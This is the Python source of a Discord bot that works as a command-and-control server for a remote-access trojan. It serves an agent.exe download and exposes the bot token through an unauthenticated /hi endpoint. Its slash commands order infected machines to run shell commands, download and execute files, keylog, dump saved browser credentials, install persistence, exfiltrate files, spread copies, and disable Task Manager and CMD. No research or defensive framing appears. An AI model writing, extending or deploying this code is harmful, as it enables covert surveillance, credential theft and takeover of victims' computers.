import discord
from discord import app_commands
from discord.ext import commands, tasks
import os
import asyncio
from aiohttp import web
from datetime import datetime, timezone, timedelta
import re
import logging
import base64
import aiohttp  # for making HTTP requests to GitHub

# ------------------- CONFIGURATION -------------------
BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
GUILD_ID = int(os.getenv("DISCORD_GUILD_ID", 0))
CONTROL_CHANNEL_NAME = os.getenv("CONTROL_CHANNEL", "control")
AGENT_CHANNEL_PREFIX = os.getenv("AGENT_PREFIX", "agent-")
STALE_THRESHOLD_MINUTES = int(os.getenv("STALE_THRESHOLD_MINUTES", 5))
PORT = int(os.getenv("PORT", 10000))
ADMIN_ROLE_NAME = os.getenv("ADMIN_ROLE", "Admin")

# GitHub release URL for agent.exe (must be a direct download link)
GITHUB_RELEASE_URL = os.getenv("GITHUB_RELEASE_URL")
if not GITHUB_RELEASE_URL:
    raise ValueError("GITHUB_RELEASE_URL environment variable not set")

if not BOT_TOKEN:
    raise ValueError("DISCORD_BOT_TOKEN environment variable not set")
if not GUILD_ID:
    raise ValueError("DISCORD_GUILD_ID environment variable not set")

# ------------------- LOGGING -------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger("bot")

# ------------------- CACHE FOR agent.exe -------------------
_binary_cache = None
_cache_timestamp = None
CACHE_TTL = timedelta(minutes=5)  # how long to keep the cached binary

async def fetch_agent_binary():
    """Fetch the agent.exe from GitHub release URL, with caching."""
    global _binary_cache, _cache_timestamp
    now = datetime.now(timezone.utc)

    # Return cached copy if still fresh
    if _binary_cache is not None and _cache_timestamp is not None:
        if now - _cache_timestamp < CACHE_TTL:
            logger.debug("Returning cached agent binary")
            return _binary_cache

    logger.info("Fetching agent.exe from GitHub release...")
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(GITHUB_RELEASE_URL) as resp:
                if resp.status != 200:
                    logger.error(f"GitHub returned {resp.status}")
                    return None
                data = await resp.read()
                _binary_cache = data
                _cache_timestamp = now
                return data
        except Exception as e:
            logger.error(f"Failed to fetch from GitHub: {e}")
            return None

# ------------------- BOT SETUP -------------------
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.messages = True

class MyBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        guild = discord.Object(id=GUILD_ID)
        self.tree.copy_global_to(guild=guild)
        await self.tree.sync(guild=guild)
        logger.info("Slash commands synced")

bot = MyBot()

# ------------------- HTTP SERVER HANDLERS -------------------
async def handle_health(request):
    return web.Response(text="OK")

async def handle_agent_download(request):
    """Serve the agent binary from GitHub release (with caching)."""
    data = await fetch_agent_binary()
    if data is None:
        return web.Response(text="Agent binary unavailable", status=503)
    return web.Response(body=data, content_type="application/octet-stream")

async def handle_token(request):
    """Return the bot token Base64‑encoded."""
    token = os.getenv("DISCORD_BOT_TOKEN")
    if not token:
        return web.Response(text="Token not configured", status=500)
    encoded = base64.b64encode(token.encode()).decode()
    return web.Response(text=encoded)

app = web.Application()
app.router.add_get("/", handle_health)
app.router.add_get("/health", handle_health)
app.router.add_get("/agent.exe", handle_agent_download)
app.router.add_get("/hi", handle_token)

async def start_http_server():
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logger.info(f"HTTP server running on port {PORT}")

# ------------------- BACKGROUND CLEANUP TASK -------------------
@tasks.loop(minutes=1)
async def clean_stale_agents():
    guild = bot.get_guild(GUILD_ID)
    if not guild:
        return

    agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
    now = datetime.now(timezone.utc)

    for channel in agent_channels:
        try:
            async for msg in channel.history(limit=10, oldest_first=True):
                if msg.author == bot.user and "**Last seen:**" in msg.content:
                    match = re.search(r"\*\*Last seen:\*\*\s*([^\n]+)", msg.content)
                    if not match:
                        logger.info(f"Deleting {channel.name} (no timestamp)")
                        await channel.delete()
                        break
                    timestamp_str = match.group(1).strip()
                    try:
                        last_seen = datetime.fromisoformat(timestamp_str.replace('Z', '+00:00'))
                        if now - last_seen > timedelta(minutes=STALE_THRESHOLD_MINUTES):
                            logger.info(f"Deleting {channel.name} (stale, last seen {last_seen})")
                            await channel.delete()
                    except Exception as e:
                        logger.error(f"Timestamp parse error for {channel.name}: {e}")
                        await channel.delete()
                    break
            else:
                logger.info(f"Deleting {channel.name} (no heartbeat message)")
                await channel.delete()
        except discord.Forbidden:
            logger.warning(f"No permission to read history in {channel.name}")
        except Exception as e:
            logger.error(f"Error processing {channel.name}: {e}")

@clean_stale_agents.before_loop
async def before_clean_stale_agents():
    await bot.wait_until_ready()

# ------------------- DISCORD EVENTS -------------------
@bot.event
async def on_ready():
    logger.info(f"Logged in as {bot.user}")
    guild = bot.get_guild(GUILD_ID)
    if guild:
        control = discord.utils.get(guild.channels, name=CONTROL_CHANNEL_NAME)
        if not control:
            await guild.create_text_channel(CONTROL_CHANNEL_NAME)
            logger.info(f"Created #{CONTROL_CHANNEL_NAME} channel")
    clean_stale_agents.start()

# ------------------- HELPER: Send command to agent -------------------
async def send_command_to_agent(interaction: discord.Interaction, cmd_text: str, ephemeral: bool = True):
    channel = interaction.channel
    if not channel.name.startswith(AGENT_CHANNEL_PREFIX):
        await interaction.response.send_message("❌ This command can only be used in an agent channel.", ephemeral=True)
        return False
    await channel.send(f"[CMD] {cmd_text}")
    await interaction.response.send_message(f"✅ Command `{cmd_text}` sent to agent.", ephemeral=ephemeral)
    return True

# ------------------- REMOVED /upload_agent COMMAND -------------------
# The upload command is no longer needed; updates are handled via GitHub release.
# If you still want a placeholder, you can add:
# @bot.tree.command(name="upload_agent", description="[Deprecated] Updates are now via GitHub")
# async def upload_agent(interaction: discord.Interaction):
#     await interaction.response.send_message("❌ Manual upload is disabled. Update the GitHub release instead.", ephemeral=True)

# ------------------- SLASH COMMANDS (unchanged except removed upload) -------------------
@bot.tree.command(name="run", description="Execute a shell command")
async def run_command(interaction: discord.Interaction, command: str):
    await send_command_to_agent(interaction, f"run {command}")

@bot.tree.command(name="screenshot", description="Take a screenshot")
async def screenshot_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "screenshot")

@bot.tree.command(name="kill", description="Terminate the agent")
async def kill_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "kill")

@bot.tree.command(name="sysinfo", description="Get detailed system information")
async def sysinfo_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "sysinfo")

@bot.tree.command(name="downloadexec", description="Download a file from URL and execute it")
async def download_exec_command(interaction: discord.Interaction, url: str, args: str = ""):
    cmd = f"downloadexec {url} {args}".strip()
    await send_command_to_agent(interaction, cmd)

@bot.tree.command(name="clipboard", description="Get or set clipboard content")
async def clipboard_command(interaction: discord.Interaction, action: str, text: str = ""):
    if action.lower() not in ["get", "set"]:
        await interaction.response.send_message("❌ Action must be 'get' or 'set'.", ephemeral=True)
        return
    if action == "set" and not text:
        await interaction.response.send_message("❌ You must provide text to set.", ephemeral=True)
        return
    cmd = f"clipboard {action} {text}".strip()
    await send_command_to_agent(interaction, cmd)

@bot.tree.command(name="ps", description="List running processes")
async def ps_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "ps")

@bot.tree.command(name="killpid", description="Kill a process by PID")
async def killpid_command(interaction: discord.Interaction, pid: int):
    await send_command_to_agent(interaction, f"killpid {pid}")

@bot.tree.command(name="keylog_start", description="Start keylogger")
async def keylog_start_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "keylog_start")

@bot.tree.command(name="keylog_stop", description="Stop keylogger and get logs")
async def keylog_stop_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "keylog_stop")

@bot.tree.command(name="creds", description="Dump saved browser credentials")
async def creds_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "creds")

@bot.tree.command(name="persist", description="Install persistence")
async def persist_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "persist")

@bot.tree.command(name="unpersist", description="Remove persistence")
async def unpersist_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "unpersist")

@bot.tree.command(name="upload", description="Upload a file from the agent")
async def upload_command(interaction: discord.Interaction, path: str):
    await send_command_to_agent(interaction, f"upload {path}")

@bot.tree.command(name="download", description="Download a file to the agent")
async def download_command(interaction: discord.Interaction, url: str, filename: str):
    await send_command_to_agent(interaction, f"download {url} {filename}")

@bot.tree.command(name="shell", description="Start an interactive shell session")
async def shell_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "shell")

@bot.tree.command(name="shell_stop", description="Stop the interactive shell")
async def shell_stop_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "shell_stop")

@bot.tree.command(name="spread", description="Create multiple copies of the agent")
async def spread_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "spread")

@bot.tree.command(name="update", description="Force the agent to self‑update")
async def update_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "update")

@bot.tree.command(name="lockdown", description="Apply system lockdown (disable Task Manager, CMD, etc.)")
async def lockdown_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "lockdown")

@bot.tree.command(name="enforce_dns", description="Flush DNS cache and disable DNS-over-HTTPS in browsers")
async def enforce_dns_command(interaction: discord.Interaction):
    await send_command_to_agent(interaction, "enforce_dns")

# ------------------- CONTROL CHANNEL COMMANDS (legacy) -------------------
@bot.command(name="agents")
async def list_agents(ctx):
    if ctx.channel.name != CONTROL_CHANNEL_NAME:
        await ctx.send("This command can only be used in the #control channel.")
        return
    guild = ctx.guild
    agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
    if not agent_channels:
        await ctx.send("No agents currently connected.")
        return
    embed = discord.Embed(title="Active Agents", color=0x00ff00)
    for ch in agent_channels:
        async for msg in ch.history(limit=10):
            if msg.author == bot.user and "**Last seen:**" in msg.content:
                embed.add_field(name=f"#{ch.name}", value=msg.content[:200], inline=False)
                break
        else:
            embed.add_field(name=f"#{ch.name}", value="No heartbeat", inline=False)
    await ctx.send(embed=embed)

# ------------------- MAIN -------------------
async def main():
    asyncio.create_task(start_http_server())
    await bot.start(BOT_TOKEN)

if __name__ == "__main__":
    asyncio.run(main())
